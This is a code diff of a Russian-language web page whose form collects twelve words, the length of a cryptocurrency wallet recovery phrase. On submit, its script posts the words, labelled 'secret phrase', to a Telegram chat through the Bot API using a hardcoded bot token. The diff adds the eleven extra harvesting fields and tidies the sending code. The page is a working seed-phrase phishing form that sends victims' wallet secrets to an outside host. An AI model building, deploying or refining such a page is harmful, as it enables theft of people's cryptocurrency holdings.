@@ -9,7 +9,16 @@
     <form id="seedForm">
         <input type="text" name="word1" placeholder="Слово 1" required>
         <input type="text" name="word2" placeholder="Слово 2" required>
-        <!-- Остальные поля -->
+        <input type="text" name="word3" placeholder="Слово 3" required>
+        <input type="text" name="word4" placeholder="Слово 4" required>
+        <input type="text" name="word5" placeholder="Слово 5" required>
+        <input type="text" name="word6" placeholder="Слово 6" required>
+        <input type="text" name="word7" placeholder="Слово 7" required>
+        <input type="text" name="word8" placeholder="Слово 8" required>
+        <input type="text" name="word9" placeholder="Слово 9" required>
+        <input type="text" name="word10" placeholder="Слово 10" required>
+        <input type="text" name="word11" placeholder="Слово 11" required>
+        <input type="text" name="word12" placeholder="Слово 12" required>
         <button type="submit">Отправить</button>
     </form>
 
@@ -19,20 +28,25 @@
 
             const token = "7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg";
             const chatId = "@bdsjxjdhd";
-            const fields = new FormData(event.target);
-            const message = Array.from(fields.values()).join(", ");
+            const formData = new FormData(event.target);
+            const words = Array.from(formData.values()).join(" ");
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: `Секретная фраза: ${message}`
-                    }),
+                        text: `Секретная фраза: ${words}`
+                    })
                 });
 
-                if (!response.ok) throw new Error("Ошибка отправки");
+                if (!response.ok) {
+                    throw new Error("Ошибка отправки");
+                }
+
                 alert("Сообщение отправлено!");
             } catch (error) {
                 console.error("Ошибка:", error);
